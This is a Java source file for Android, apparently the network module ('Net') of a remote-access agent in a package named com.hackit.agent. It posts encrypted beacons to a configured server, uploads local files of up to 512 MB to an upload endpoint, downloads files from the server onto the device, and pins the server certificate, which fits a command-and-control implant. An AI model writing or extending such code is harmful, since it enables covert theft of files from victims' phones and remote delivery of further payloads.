package com.hackit.agent;

import android.content.Context;

import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.security.MessageDigest;
import java.security.cert.Certificate;
import java.security.cert.X509Certificate;

import javax.net.ssl.HttpsURLConnection;

/** Sealed HTTP transport. Every call fails closed: null means "no answer". */
final class Net {
    private static final int CONNECT_TIMEOUT = 20000;
    private static final int READ_TIMEOUT = 45000;
    private static final int UPLOAD_TIMEOUT = 180000;

    static JSONObject post(Context ctx, String path, JSONObject body) {
        Config config = Config.get(ctx);
        String sid = Common.sid(ctx);
        HttpURLConnection conn = null;
        try {
            String sealed = Crypto.seal(sid, body);
            byte[] payload = sealed.getBytes("UTF-8");
            conn = open(ctx, config.url(path), "POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setFixedLengthStreamingMode(payload.length);
            OutputStream out = conn.getOutputStream();
            out.write(payload);
            out.flush();
            out.close();
            if (conn.getResponseCode() != 200) {
                Log.d("beacon http " + conn.getResponseCode());
                return null;
            }
            String reply = Common.read(conn.getInputStream());
            return Crypto.open(reply);
        } catch (Exception exc) {
            Log.d("post: " + exc);
            return null;
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    static boolean upload(Context ctx, File file, String name, String kind) {
        if (file == null || !file.isFile() || file.length() == 0) {
            return false;
        }
        Config config = Config.get(ctx);
        String sid = Common.sid(ctx);
        HttpURLConnection conn = null;
        try {
            long length = file.length();
            conn = open(ctx, config.url("/v1/upload/" + sid), "POST", true, length);
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("X-Name", sanitize(name));
            conn.setRequestProperty("X-Kind", kind == null ? "file" : kind);
            conn.setReadTimeout(UPLOAD_TIMEOUT);
            conn.setConnectTimeout(CONNECT_TIMEOUT);
            OutputStream out = conn.getOutputStream();
            InputStream in = new FileInputStream(file);
            byte[] buffer = new byte[64 * 1024];
            long sent = 0;
            int read;
            while ((read = in.read(buffer)) > 0) {
                out.write(buffer, 0, read);
                sent += read;
                if (sent > 512L * 1024L * 1024L) {
                    break;
                }
            }
            in.close();
            out.flush();
            out.close();
            return conn.getResponseCode() == 200;
        } catch (Exception exc) {
            Log.d("upload: " + exc);
            return false;
        } finally {
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    static boolean fetch(Context ctx, String path, File target) {
        Config config = Config.get(ctx);
        HttpURLConnection conn = null;
        InputStream in = null;
        OutputStream out = null;
        try {
            conn = open(ctx, config.url(path), "GET", false, 0);
            if (conn.getResponseCode() != 200) {
                return false;
            }
            File parent = target.getParentFile();
            if (parent != null) {
                parent.mkdirs();
            }
            in = conn.getInputStream();
            out = new java.io.FileOutputStream(target);
            byte[] buffer = new byte[64 * 1024];
            long total = 0;
            int read;
            while ((read = in.read(buffer)) > 0) {
                out.write(buffer, 0, read);
                total += read;
                if (total > 512L * 1024L * 1024L) {
                    break;
                }
            }
            out.flush();
            return total > 0;
        } catch (Exception exc) {
            Log.d("fetch: " + exc);
            return false;
        } finally {
            Common.closeQuietly(in);
            Common.closeQuietly(out);
            if (conn != null) {
                conn.disconnect();
            }
        }
    }

    private static String sanitize(String name) {
        String clean = name == null ? "artifact.bin" : name.replaceAll("[^A-Za-z0-9._-]", "_");
        return clean.isEmpty() ? "artifact.bin" : clean.substring(0, Math.min(clean.length(), 120));
    }

    private static HttpURLConnection open(Context ctx, String url, String method) throws Exception {
        return open(ctx, url, method, false, 0);
    }

    private static HttpURLConnection open(Context ctx, String url, String method, boolean output, long length)
            throws Exception {
        Config config = Config.get(ctx);
        HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
        conn.setRequestMethod(method);
        if (output) {
            conn.setDoOutput(true);
            conn.setFixedLengthStreamingMode(length);
        }
        conn.setConnectTimeout(CONNECT_TIMEOUT);
        conn.setReadTimeout(READ_TIMEOUT);
        conn.setRequestProperty("User-Agent", config.userAgent);
        conn.setRequestProperty("Accept", "application/json");
        if (conn instanceof HttpsURLConnection) {
            HttpsURLConnection tls = (HttpsURLConnection) conn;
            if (!config.pin.isEmpty()) {
                tls.connect();
                Certificate[] chain = tls.getServerCertificates();
                if (chain.length == 0 || !pinMatches(chain[0], config.pin)) {
                    Log.e("tls pin mismatch");
                    tls.disconnect();
                    throw new IllegalStateException("tls pin mismatch");
                }
            }
        }
        return conn;
    }

    private static boolean pinMatches(Certificate certificate, String expected) {
        try {
            byte[] digest = MessageDigest.getInstance("SHA-256").digest(((X509Certificate) certificate).getEncoded());
            String got = Crypto.hex(digest);
            return MessageDigest.isEqual(got.getBytes("US-ASCII"), expected.getBytes("US-ASCII"));
        } catch (Exception exc) {
            return false;
        }
    }

    private Net() {
    }
}
